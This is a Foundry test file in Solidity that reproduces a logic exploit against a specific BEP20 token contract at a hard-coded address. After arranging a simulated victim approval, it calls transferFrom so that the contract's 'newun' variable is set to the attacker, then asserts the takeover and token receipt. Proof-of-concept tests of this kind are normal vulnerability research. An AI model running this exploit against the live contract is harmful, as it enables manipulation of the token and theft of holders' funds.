// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface TokenBEP20 {
    function transferFrom(address from, address to, uint tokens) external returns (bool success);
    function approve(address spender, uint tokens) external returns (bool success);
    function balanceOf(address tokenOwner) external view returns (uint balance);
    function newun() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x63769c0499f94D4E31fAc0F01D5d226bdd2C927D;
    address attacker = address(this);
    TokenBEP20 target;
    address victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = TokenBEP20(TARGET);
        victim = address(0x1337);
        vm.label(victim, "Victim");
        vm.label(attacker, "Attacker");

        // Inject tokens to victim
        deal(TARGET, victim, 1000 * 1e18);

        // Have victim approve attacker to spend tokens
        vm.startPrank(victim);
        target.approve(attacker, 1000 * 1e18);
        vm.stopPrank();

        // Verify initial state
        require(target.newun() == address(0), "newun should be 0 initially");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Call transferFrom when newun is address(0)
        // This will set newun = attacker (the 'to' address)
        target.transferFrom(victim, attacker, 100 * 1e18);

        // Verify the exploit worked - newun is now set
        assertGt(uint160(target.newun()), 0, "newun should be set to non-zero address");

        // Verify attacker received tokens
        assertGt(target.balanceOf(attacker), 0, "attacker should have tokens");
        assertTrue(target.newun() != address(0), "Logic Exploit Failed: Value unchanged");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
